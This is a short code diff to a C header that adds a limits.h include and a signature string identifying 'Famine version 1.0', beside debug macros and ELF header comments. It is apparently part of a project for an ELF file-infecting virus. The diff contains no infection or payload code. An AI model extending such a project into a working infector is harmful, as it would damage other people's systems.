@@ -14,6 +14,7 @@
 # include <sys/mman.h>
 # include <sys/stat.h>
 # include <unistd.h>
+# include <limits.h>
 
 
 # if DEBUG
@@ -22,6 +23,8 @@
 # else
 #  define LOG(...) ((void)0)
 # endif
+
+# define FAMINE_SIG "Famine version 1.0 (c)oded by cbopp-mvan-wij"
 
 /*
  * Elf64_Ehdr (file header)
